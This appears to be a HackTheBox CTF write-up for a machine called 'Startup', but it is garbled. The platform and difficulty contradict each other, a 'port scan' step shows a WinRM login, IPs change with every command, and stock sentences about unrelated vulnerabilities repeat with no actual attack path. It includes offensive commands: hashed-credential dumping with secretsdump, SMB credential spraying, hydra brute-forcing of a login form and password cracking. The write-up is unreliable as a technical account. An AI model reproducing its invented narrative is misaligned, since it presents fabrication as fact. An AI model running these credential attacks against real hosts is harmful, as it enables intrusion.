---
TitleSEO: "HackTheBox — Startup (Insane FreeBSD) | ZureFX"
TitlePost: "HackTheBox — Startup (Insane FreeBSD)"
Author: "ZureFX"
Description: "Full writeup for HackTheBox Startup. Resource-Based Constrained Delegation and AlwaysInstallElevated to achieve insane compromise on FreeBSD."
Keywords: "active directory, easy, ctf, linux"
URL: "https://zurefx.github.io/writeups/htb-startup-472.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-startup-472/"
Date: "2024-10-25"
Tags: "Active Directory, Easy, CTF, Linux"
Section: "writeups"
Lang: "en"
main_img: "htb-startup-472"
Permalink: "/writeups/htb-startup-472.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Startup** is rated **Insane** on HackTheBox. It runs **FreeBSD** and the IP address during this analysis was `10.123.168.25`.

### Objectives

The kernel version was outdated and vulnerable to a publicly known exploit. Post-exploitation enumeration revealed a path to domain administrator privileges.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
evil-winrm -i 10.64.193.23 -u administrator -p 'P@ssw0rd!'
```

The web application was vulnerable to Server-Side Template Injection (SSTI). Network traffic analysis revealed unencrypted communications containing user credentials.

### Service Enumeration

The kernel version was outdated and vulnerable to a publicly known exploit. The service account had excessive permissions assigned in Active Directory. Network traffic analysis revealed unencrypted communications containing user credentials.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.124.207.84/FUZZ
crackmapexec smb 10.65.252.13 -u administrator -p 'P@ssw0rd!' --shares
crackmapexec smb 10.13.43.67 -u administrator -p 'P@ssw0rd!' --shares
impacket-secretsdump administrator:'P@ssw0rd!'@10.91.104.39
```

Privilege escalation was possible due to misconfigured sudo permissions. The service was running without proper input validation, leading to injection vulnerabilities.

### SMB Enumeration

Lateral movement was facilitated by reusing discovered credentials across services. The kernel version was outdated and vulnerable to a publicly known exploit.

```bash
crackmapexec smb 10.128.124.136 -u administrator -p 'P@ssw0rd!' --shares
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.15.144 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
feroxbuster -h
```

Post-exploitation enumeration revealed a path to domain administrator privileges. Group Policy Preferences contained encrypted but recoverable credentials. Unconstrained delegation was enabled on the compromised machine.

## Exploitation

### Vulnerability Identification

The web application was vulnerable to Server-Side Template Injection (SSTI). The application stored sensitive credentials in an unencrypted configuration file. The service was running without proper input validation, leading to injection vulnerabilities.

Key finding: **SQL Injection**.

Weak file permissions allowed modification of critical system files. Token impersonation allowed elevation to SYSTEM privileges on the target.

### Initial Access

Post-exploitation enumeration revealed a path to domain administrator privileges. The kernel version was outdated and vulnerable to a publicly known exploit.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.26.2.14
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
evil-winrm -i 10.69.103.211 -u administrator -p 'P@ssw0rd!'
```

Authentication bypass was achieved through careful manipulation of the login mechanism. The backup files contained sensitive information that should not have been accessible. The service was running without proper input validation, leading to injection vulnerabilities.

## Privilege Escalation

### Enumeration

The service account had excessive permissions assigned in Active Directory. The web application was vulnerable to Server-Side Template Injection (SSTI). Unconstrained delegation was enabled on the compromised machine.

```powershell
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.65.203.118/FUZZ
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.75.49.3/FUZZ
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.75.92.246 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
feroxbuster -h
```

### Exploitation

Command injection was possible through unsanitized user input in the search functionality. The database credentials were hardcoded in the application source code.

```powershell
impacket-secretsdump administrator:'P@ssw0rd!'@10.72.23.25
```

Group Policy Preferences contained encrypted but recoverable credentials. The application stored sensitive credentials in an unencrypted configuration file.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

The application stored sensitive credentials in an unencrypted configuration file. The scheduled task ran with elevated privileges and could be abused for escalation.

## Summary

### Tools Used

- `smbexec`
- `rubeus`
- `evil-winrm`
- `gobuster`
- `socat`
- `kerbrute`
- `rpcclient`
- `bloodhound`

### Key Takeaways

- Resource-Based Constrained Delegation
- AlwaysInstallElevated
- SQL Injection
